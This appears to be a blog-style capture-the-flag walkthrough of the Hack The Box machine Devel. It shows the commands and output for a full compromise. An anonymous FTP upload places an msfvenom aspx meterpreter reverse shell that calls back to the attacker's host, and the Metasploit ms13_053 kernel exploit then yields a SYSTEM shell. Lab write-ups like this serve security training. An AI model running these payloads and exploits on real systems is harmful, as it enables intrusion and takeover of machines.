---
title: Hack The Box - Devel
date: 2023-01-5 08:33:00 +0800
categories: [Vulnhub]
tags: [vulnhub]
math: true
mermaid: true
toc: true
comments: true
---

RECON


NMAP
Strating with nmap  it shows two ports open 80 httpd  and 21 ftp
```
┌─[root@linux]─[/home/htb/windows_box/devel] 
└──╼ #nmap -sC -sV 10.10.10.5 -oN devel.htb 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 21:31 +0545 
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 
SYN Stealth Scan Timing: About 93.13% done; ETC: 21:32 (0:00:06 remaining) 
Nmap scan report for 10.10.10.5 
Host is up (0.51s latency). 
Not shown: 998 filtered tcp ports (no-response) 
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     Microsoft ftpd 
| ftp-anon: Anonymous FTP login allowed (FTP code 230) 
| 03-18-17  01:06AM       <DIR>          aspnet_client 
| 12-11-22  11:46AM                 2753 aspxshell.aspx 
| 03-17-17  04:37PM                  689 iisstart.htm 
| 12-11-22  11:38AM                   19 text.txt 
|_03-17-17  04:37PM               184946 welcome.png 
| ftp-syst:  
|_  SYST: Windows_NT 
80/tcp open  http    Microsoft IIS httpd 7.5 
|_http-title: IIS7 
|_http-server-header: Microsoft-IIS/7.5 
| http-methods:  
|_  Potentially risky methods: TRACE 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 122.97 seconds
```
nmap shows that anonymoys ftp login  is enabled. we can now try to upload file.

WEB PORT - 80
The page is just the default IIS page:

HEADERS
Seeing that this server is running ASP.NET  means we can upload  a .aspx webshell and get shell.
```
┌─[root@linux]─[/home/htb/windows_box/devel] 
└──╼ #curl -I 10.10.10.5 
HTTP/1.1 200 OK 
Content-Length: 689 
Content-Type: text/html 
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT 
Accept-Ranges: bytes 
ETag: "37b5ed12c9fd21:0" 
Server: Microsoft-IIS/7.5 
X-Powered-By: ASP.NET 
Date: Thu, 05 Jan 2023 02:28:13 GMT
```

METERPRETER
Generating meterpreter reverse shell .
```
┌─[root@linux]─[/home/htb/windows_box/devel] 
└──╼ #msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx > shell.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x86 from the payload 
No encoder specified, outputting raw payload 
Payload size: 354 bytes 
Final size of aspx file: 2878 bytes
```
uploading reverse shell using ftp anoymous login .
```
┌─[root@linux]─[/home/htb/windows_box/devel] 
└──╼ #ftp 10.10.10.5 
Connected to 10.10.10.5. 
220 Microsoft FTP Service 
Name (10.10.10.5:niraz): anonymous 
331 Anonymous access allowed, send identity (e-mail name) as password. 
Password: 
230 User logged in. 
Remote system type is Windows_NT. 
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx 
200 PORT command successful. 
150 Opening ASCII mode data connection. 
226 Transfer complete. 
2918 bytes sent in 0.00 secs (13.6413 MB/s) 
ftp>
```


SHELL AS WEB

```
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > show options 
Module options (exploit/multi/handler): 
   Name  Current Setting  Required  Description 
   ----  ---------------  --------  ----------- 
Payload options (windows/meterpreter/reverse_tcp): 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none) 
   LHOST     10.10.14.22      yes       The listen address (an interface may be specified) 
   LPORT     4444             yes       The listen port 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Wildcard Target 
View the full module info with the info, or info -d command. 
msf6 exploit(multi/handler) > run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5 
[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.10.5:49157) at 2023-01-05 07:48:54 +0545 
meterpreter > sysinfo 
Computer        : DEVEL 
OS              : Windows 7 (6.1 Build 7600). 
Architecture    : x86 
System Language : el_GR 
Domain          : HTB 
Logged On Users : 2 
Meterpreter     : x86/windows 
meterpreter >

c:\windows\system32\inetsrv>whoami 
whoami 
iis apppool\web

```
PRIV ESEC TO SYSTEM
using metasploit post module local exploit suggester  to look for available methods to priv esec.
```
msf6 exploit(multi/handler) > search suggester 
Matching Modules 
================ 
   #  Name                                      Disclosure Date  Rank    Check  Description 
   -  ----                                      ---------------  ----    -----  ----------- 
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester 
Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester 
msf6 exploit(multi/handler) > use 0 
msf6 post(multi/recon/local_exploit_suggester) > show options 
Module options (post/multi/recon/local_exploit_suggester): 
   Name             Current Setting  Required  Description 
   ----             ---------------  --------  ----------- 
   SESSION                           yes       The session to run this module on 
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits 
View the full module info with the info, or info -d command. 
msf6 post(multi/recon/local_exploit_suggester) > set session 1 
session => 1 
msf6 post(multi/recon/local_exploit_suggester) > run 
[*] 10.10.10.5 - Collecting local exploits for x86/windows... 
[*] 10.10.10.5 - 176 exploit checks are being tried... 
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. 
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated. 
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. 
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. 
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. 
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. 
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. 
[*] Running check method for exploit 41 / 41 
[*] 10.10.10.5 - Valid modules for session 1:
```

MS13_053

Description:
This module leverages a kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation.
```
msf6 exploit(windows/local/ms13_053_schlamperei) > set session 1 
session => 1 
msf6 exploit(windows/local/ms13_053_schlamperei) > run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Launching notepad to host the exploit... 
[+] Process 2860 launched. 
[*] Reflectively injecting the exploit DLL into 2860... 
[*] Injecting exploit into 2860... 
[*] Found winlogon.exe with PID 428 
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell 
[*] Sending stage (175686 bytes) to 10.10.10.5 
[*] Meterpreter session 2 opened (10.10.14.22:4444 -> 10.10.10.5:49158) at 2023-01-05 08:00:21 +0545 
meterpreter > shell 
Process 2532 created. 
Channel 1 created. 
Microsoft Windows [Version 6.1.7600] 
Copyright (c) 2009 Microsoft Corporation.  All rights reserved. 
C:\Windows\system32>whoami 
whoami 
nt authority\system
```
